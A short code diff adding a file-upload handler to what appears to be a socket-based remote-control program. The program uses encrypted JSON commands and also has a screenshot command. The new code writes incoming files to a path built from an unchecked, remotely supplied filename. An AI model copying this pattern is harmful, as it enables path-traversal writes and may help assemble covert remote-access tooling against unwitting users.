@@ -69,6 +69,27 @@ def main():
                     file.close()
                 conn.sendall(cipher.encrypt_message(response))
 
+            elif data['type'] == "upload":
+                filename = data['action']
+                response = json.dumps({
+                    'status': 'OK',
+                    'response': 'Waiting'
+                }).encode('utf-8')
+
+                conn.sendall(cipher.encrypt_message(response))                
+                
+                listen = listener.listen()
+                conn = listen["conn"]
+                data = listen["data"]
+                file = open(f'download/{filename}' , 'wb')
+                file.write(data)
+                file.close()
+                response = json.dumps({
+                    'status': 'OK',
+                    'response': 'Download complete!'
+                }).encode('utf-8')
+                conn.sendall(cipher.encrypt_message(response))
+
             elif data['type'] == "screenshot":
                 now = datetime.now()
                 date = now.strftime("%d%m_%H%M")
